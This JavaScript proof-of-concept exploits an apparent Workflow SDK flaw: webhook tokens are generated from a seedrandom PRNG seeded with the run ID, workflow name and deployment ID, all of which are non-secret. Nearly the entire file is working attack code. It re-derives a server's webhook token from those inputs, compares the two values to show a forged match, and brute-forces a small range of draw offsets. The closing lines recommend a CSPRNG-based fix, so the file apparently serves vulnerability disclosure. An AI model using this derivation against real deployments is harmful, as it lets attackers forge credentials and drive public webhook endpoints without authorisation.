// PoC: Workflow SDK webhook/hook tokens are derivable from non-secret inputs.
// The workflow VM installs a SEEDED PRNG as Math.random (vm/index.ts:55,61):
//     const rng = seedrandom(`${runId}:${workflowName}:${deploymentId}`); g.Math.random = rng;
// and mints the hook/webhook token from that seeded stream (workflow.ts:406-408, hook.ts:100):
//     generateNanoid = customRandom(urlAlphabet, 21, size => new Uint8Array(size).map(()=>256*Math.random()))
//     token = ctx.generateNanoid()
// createWebhook() forbids a developer-supplied token (create-hook.ts:63-67) and puts the
// generated token in the PUBLIC webhook URL. So the token — the only credential guarding a
// public-by-design endpoint — is a deterministic function of NON-SECRET inputs.
//
// Uses the EXACT dependency versions the framework pins: seedrandom@3.0.5, nanoid@5.1.6.
import seedrandom from 'seedrandom';
import { customRandom, urlAlphabet } from 'nanoid';

// Faithful reproduction of the framework's token generation for the common case where the
// webhook token is the run's first randomness draw (a workflow whose first act is createWebhook()).
function deriveWebhookToken(runId, workflowName, deploymentId, drawOffset = 0) {
  const seed = `${runId}:${workflowName}:${deploymentId}`; // workflow.ts:353
  const rng = seedrandom(seed);                             // vm/index.ts:55  (== Math.random)
  for (let i = 0; i < drawOffset; i++) rng();               // skip any earlier draws
  const generateNanoid = customRandom(urlAlphabet, 21, (size) =>
    new Uint8Array(size).map(() => 256 * rng())             // workflow.ts:406-408
  );
  return generateNanoid();                                  // hook.ts:100
}

console.log('=== Workflow SDK predictable webhook-token PoC ===');
console.log('(seedrandom@' + seedrandom.version + ', nanoid@5.1.6)\n');

// --- The framework, on the server, mints a webhook token for a run ---
const runId = 'wf_run_9f3ab21c7e';          // resource id the framework hands back to callers
const workflowName = 'verifyEmail';          // the exported workflow function name (known)
const deploymentId = 'postgres';             // constant on self-hosted world-postgres (queue.ts:135)
const serverToken = deriveWebhookToken(runId, workflowName, deploymentId);
console.log('[server]   createWebhook() minted token:', serverToken);
console.log('[server]   public URL: /.well-known/workflow/v1/webhook/' + serverToken + '\n');

// --- The attacker never sees the token. They only learn the runId (URL/log/API/IDOR),
//     know the workflow function name, and the deploymentId. They re-derive it: ---
const attackerToken = deriveWebhookToken(runId, workflowName, deploymentId);
console.log('[attacker] knows only runId + workflowName + deploymentId (all non-secret)');
console.log('[attacker] re-derived token:            ', attackerToken);
console.log('[attacker] MATCH:', attackerToken === serverToken ? 'YES — token forged without ever seeing it' : 'no');
console.log('');

// --- Even if the exact draw offset is unknown, it is a tiny brute-force space ---
console.log('If the token is not the first draw, the attacker enumerates a small offset range:');
for (let off = 0; off < 5; off++) {
  console.log('  offset ' + off + ' -> ' + deriveWebhookToken(runId, workflowName, deploymentId, off));
}
console.log('\nThe 21-char token LOOKS like ~125 bits of entropy but is fully determined by a');
console.log('non-secret seed. Fix: mint the token from a host CSPRNG on first execution and read');
console.log('it back from the persisted hook_created event on replay (world/src/hooks.ts already stores it).');
